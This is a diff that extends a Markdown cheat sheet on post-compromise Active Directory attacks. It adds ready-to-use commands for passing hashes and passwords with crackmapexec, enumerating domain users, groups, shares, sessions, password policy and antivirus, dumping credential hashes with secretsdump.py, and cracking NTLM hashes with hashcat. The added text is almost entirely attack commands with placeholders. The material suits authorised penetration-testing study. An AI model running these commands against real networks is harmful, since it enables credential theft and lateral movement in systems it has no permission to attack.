@@ -263,9 +263,50 @@
         *  Shortest path to Kerberoastable Users
 
 ## Attacking AD: Post-Compromise Attacks
-### Pass the password with Crackmapexec
+### CrackMapExec
+After capturing a hash or cracking a hash you can pass it around the network with crackmapexec.
+#### Pass the hash with crackmapexec
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -H <LM Hash> --local-auth
+```
+#### Pass the password with crackmapexec
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> 
+```
+#### Enumeration with crackmapexec
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --users
+```
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --groups
+```
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --loggedon-users
+```
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --shares
+```
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --pass-pol
+```
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> --sessions
+```
+```sh
+crackmapexec smb <IP/Network> -d <domain> domain -u <user> -p <password> -M enum_av
+```
+
 
 ### Dump Hashes with secretsdump.py
+```sh
+secretsdump.py <domain>/<user>:<password>@<IP>
+```
+
+### Crack the hash with hashcat
+```powershell
+.\hashcat -m 1000 .\ntlmhash.txt .\rockyou.txt -O
+```
+
 ### Token Impersonation
 ### kerberoasting
 ### Abusing GPP
